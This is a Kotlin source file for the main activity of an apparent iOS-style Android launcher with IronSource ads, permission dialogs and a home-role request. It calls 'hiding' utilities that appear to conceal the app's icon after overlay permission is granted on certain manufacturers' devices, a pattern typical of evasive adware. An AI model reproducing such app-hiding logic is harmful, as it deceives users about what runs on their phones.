package com.iosapp.ioslauncher.ui.app

import android.Manifest
import android.app.role.RoleManager
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.provider.Settings
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.constraintlayout.motion.widget.MotionLayout
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import androidx.fragment.app.FragmentManager
import androidx.viewpager.widget.ViewPager
import com.iosapp.ioslauncher.LauncherApplication
import com.iosapp.ioslauncher.R
import com.iosapp.ioslauncher.base.BaseActivity
import com.iosapp.ioslauncher.data.Prefs
import com.iosapp.ioslauncher.databinding.AppActivityBinding
import com.iosapp.ioslauncher.ui.custom.ShutterView
import com.iosapp.ioslauncher.ui.dialogs.DialogNotificationsPermissions
import com.iosapp.ioslauncher.ui.dialogs.DialogPermission
import com.iosapp.ioslauncher.ui.dialogs.DialogTutorial
import com.iosapp.ioslauncher.utils.EXTRAS_HIDING
import com.iosapp.ioslauncher.utils.IRON_SOURCE_APP_KEY
import com.iosapp.ioslauncher.utils.hiding.AlarmBroadcast
import com.iosapp.ioslauncher.utils.hiding.AppHidingUtil
import com.iosapp.ioslauncher.utils.hiding.HidingBroadcast
import com.ironsource.mediationsdk.IronSource
import java.util.*


class AppActivity : BaseActivity<AppViewModel, AppActivityBinding>(R.layout.app_activity),
    ShutterView.PermissionHelper {
    private val roleIntent =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {

        }

    private val fragmentLifecycleCallback = object : FragmentManager.FragmentLifecycleCallbacks() {
        override fun onFragmentViewDestroyed(fm: FragmentManager, f: Fragment) {
            if (f is DialogTutorial && !hasNotificationPermission()) {
                DialogNotificationsPermissions().show(supportFragmentManager, "tag")
            } else {
                askRole()
                supportFragmentManager.unregisterFragmentLifecycleCallbacks(this)
            }
        }
    }
    override val viewModel: AppViewModel by viewModels()

    override fun onNewIntent(intent: Intent?) {
        if (intent?.getStringExtra(EXTRAS_HIDING) == EXTRAS_HIDING) {
            if (!Settings.canDrawOverlays(this)) {
                startActivity(
                    Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                        .setData(Uri.fromParts("package", LauncherApplication.instance.packageName, null))
                )
            }
        }
        super.onNewIntent(intent)
    }

    private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
        "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
    )

    override fun onResume() {
        super.onResume()
        IronSource.onResume(this)
        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
        else
            HidingBroadcast.startAlarm(this)
    }

    override fun onPause() {
        super.onPause()
        IronSource.onPause(this)
    }


    override fun setupUI() {
        IronSource.setMetaData("is_child_directed","false")
        IronSource.init(this, IRON_SOURCE_APP_KEY)
        AlarmBroadcast.startAlarm(this)
        binding.mainPages.adapter = MainVPAdapter(viewModel, this, binding.mainPages)
        binding.mainPages.addOnPageChangeListener(object : ViewPager.OnPageChangeListener {
            override fun onPageScrolled(
                position: Int,
                positionOffset: Float,
                positionOffsetPixels: Int
            ) {

            }

            override fun onPageSelected(position: Int) {
                if (position == 0) viewModel.isSelectionEnabled.set(false)
            }

            override fun onPageScrollStateChanged(state: Int) {

            }

        })
        binding.mainPages.currentItem = 1

        if (!Prefs.isShowingTutorial) {
            DialogTutorial().show(supportFragmentManager, "tag")
        } else if (!hasNotificationPermission()) {
            DialogNotificationsPermissions().show(supportFragmentManager, "tag")
        } else {
            askRole()
            supportFragmentManager.unregisterFragmentLifecycleCallbacks(fragmentLifecycleCallback)
        }

        supportFragmentManager.registerFragmentLifecycleCallbacks(object :
            FragmentManager.FragmentLifecycleCallbacks() {
            override fun onFragmentViewDestroyed(fm: FragmentManager, f: Fragment) {
                super.onFragmentViewDestroyed(fm, f)
                if (f is DialogNotificationsPermissions) {
                    askRole()
                    supportFragmentManager.unregisterFragmentLifecycleCallbacks(this)
                } else if (!hasNotificationPermission()) DialogNotificationsPermissions()
                    .show(supportFragmentManager, "tag")
                else {
                    askRole()
                    supportFragmentManager.unregisterFragmentLifecycleCallbacks(this)
                }
            }
        }, true)
    }

    private fun hasNotificationPermission() = NotificationManagerCompat
        .getEnabledListenerPackages(this).contains(packageName)

    private fun askRole() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            with(getSystemService(RoleManager::class.java)) {
                if (!isRoleAvailable(RoleManager.ROLE_HOME) || isRoleHeld(RoleManager.ROLE_HOME)) return
                createRequestRoleIntent(RoleManager.ROLE_HOME)
                    .let(roleIntent::launch)
            }
        } else {
            val launcherIntent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME)
            packageManager.resolveActivity(launcherIntent, PackageManager.MATCH_DEFAULT_ONLY)
                ?.activityInfo?.packageName
                ?.takeIf { it != packageName }
                ?.let { roleIntent.launch(launcherIntent) }
        }
    }

    override fun hasBluetoothPermission() =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            ContextCompat.checkSelfPermission(this, Manifest.permission.BLUETOOTH_CONNECT) ==
                    PackageManager.PERMISSION_GRANTED
        else true

    override fun aksBluetoothPermission(action: () -> Unit) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            askPermission(arrayOf(Manifest.permission.BLUETOOTH_CONNECT)) {
                action.invoke()
            }
        }
    }

    override fun showPermissionsDialog() {
        DialogPermission()
            .show(supportFragmentManager, "dialog_permission")
    }

    override fun onBackPressed() {
        when {
            findViewById<MotionLayout>(R.id.motionView).progress > 0.2f ->
                findViewById<MotionLayout>(R.id.motionView).transitionToStart()
            binding.mainPages.currentItem == 0 -> binding.mainPages.currentItem++
            else -> {
                viewModel.isSelectionEnabled.set(false)
                super.onBackPressed()
            }
        }
    }

    override fun onStop() {
        super.onStop()
        viewModel.isSelectionEnabled.set(false)
    }
}